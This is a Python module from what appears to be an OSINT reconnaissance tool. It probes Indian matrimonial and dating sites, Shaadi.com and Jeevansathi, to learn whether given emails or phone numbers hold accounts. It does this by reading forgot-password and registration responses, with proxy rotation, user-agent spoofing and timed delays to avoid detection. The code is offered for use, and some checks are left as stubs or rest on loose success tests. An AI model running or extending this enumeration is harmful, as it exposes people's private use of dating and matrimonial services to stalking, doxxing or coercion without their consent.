"""Dating & Matrimonial Enumeration Module for EXO-OSINT
Authorized red team simulation of adversary reconnaissance on Indian platforms.
Uses password-reset and registration flow leakage detection.
"""

import random
import time
import threading
import requests
from typing import List, Dict, Optional
from urllib.parse import urlencode
from . import ui
from .types import ModuleResult

class DatingEnumerator:
    def __init__(self, proxies: Optional[List[str]] = None, threads: int = 8, stealth: bool = True):
        self.proxies = proxies or []
        self.threads = threads
        self.stealth = stealth
        self.results: Dict = {}
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
            # Extend with more
        ]

    def _get_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({"User-Agent": random.choice(self.user_agents)})
        if self.proxies:
            session.proxies = {"http": random.choice(self.proxies), "https": random.choice(self.proxies)}
        return session

    def _check_shaadi(self, identifier: str, is_email: bool = True) -> Dict:
        session = self._get_session()
        try:
            if is_email:
                payload = {"email": identifier, "action": "forgotPassword"}
                r = session.post("https://www.shaadi.com/shaadi-info/forgot-password", data=payload, timeout=12)
                exists = any(x in r.text.lower() for x in ["reset", "account found", "we have sent"])
            else:
                # Phone flow adaptation
                payload = {"phone": identifier}
                r = session.post("https://www.shaadi.com/registration", data=payload, timeout=12)
                exists = "already registered" in r.text.lower() or r.status_code in (200, 302)
            return {"platform": "Shaadi.com", "identifier": identifier, "exists": exists, "confidence": "high"}
        except Exception:
            return {"platform": "Shaadi.com", "identifier": identifier, "exists": False, "confidence": "low"}

    # Add similar methods for Jeevansathi, BharatMatrimony, TrulyMadly, Woo, QuackQuack
    # Example pattern for Jeevansathi:
    def _check_jeevansathi(self, identifier: str, is_email: bool = True) -> Dict:
        session = self._get_session()
        try:
            if is_email:
                r = session.post("https://www.jeevansathi.com/login/forgotpassword", 
                               data={"email": identifier}, timeout=12)
                exists = "password reset" in r.text.lower() or "account exists" in r.text.lower()
            else:
                r = session.get(f"https://www.jeevansathi.com/search?phone={identifier}", timeout=12)
                exists = "profile" in r.text.lower()
            return {"platform": "Jeevansathi.com", "identifier": identifier, "exists": exists}
        except:
            return {"platform": "Jeevansathi.com", "identifier": identifier, "exists": False}

    # Extend _check_bharatmatrimony, _check_trulymadly etc. following identical pattern

    def enumerate(self, emails: List[str], phones: List[str]) -> Dict:
        def worker(targets: List[str], check_func, is_email: bool):
            for t in targets:
                if self.stealth:
                    time.sleep(random.uniform(2.0, 4.5))
                res = check_func(t, is_email)
                self.results[f"{res['platform']}_{t}"] = res
                ui.stealth_sleep()

        threads = []
        # Emails
        if emails:
            for check_func in [self._check_shaadi, self._check_jeevansathi]:  # Add others
                t = threading.Thread(target=worker, args=(emails, check_func, True))
                threads.append(t)
                t.start()
        # Phones - similar threading

        for t in threads:
            t.join()
        return self.results

# Integration hook for cli.py / email_recon.py
def run_dating_recon(targets: Dict, config: Dict) -> ModuleResult:
    enumerator = DatingEnumerator(proxies=config.get("proxies"), stealth=config.get("stealth", True))
    emails = [t for t in targets.get("emails", []) if t]
    phones = [t for t in targets.get("phones", []) if t]
    results = enumerator.enumerate(emails, phones)
    return ModuleResult(name="dating_matrimonial", data=results, success=bool(results))
